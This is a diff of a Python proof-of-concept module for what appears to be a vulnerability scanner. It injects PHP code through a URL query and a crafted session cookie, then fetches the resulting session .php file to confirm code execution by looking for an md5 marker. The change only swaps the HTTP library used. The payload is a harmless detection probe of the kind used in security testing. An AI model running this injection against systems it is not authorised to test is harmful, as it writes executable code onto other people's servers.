@@ -34,12 +34,13 @@ class Poc(ABPoc):
                 target=self.target, vuln=self.vuln))
             arg = '{target}'.format(target=self.target)
             url = arg + "/index.php?<?print(md5(0x22))?>"
-            data = "'Cookie: sessionID=1.php;PHPSESSIN=1.php;\r\n'"
-            code, head, res, errcode,finalurl =  hh.http('"' + url + '"' + " -H " +data)
+            data = {
+              'Cookie': 'sessionID=1.php;PHPSESSIN=1.php;' 
+            }
+            _res = requests.get(url, headers=data)
 
             checkURL = arg + "/union/data/session/mvm_sess_1.php"
             code1, head1, res1, errcode1,finalurl1 = hh.http(checkURL)
-                       
             if res1.find("e369853df766fa44e1ed0ff613f563bd") != -1:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
 
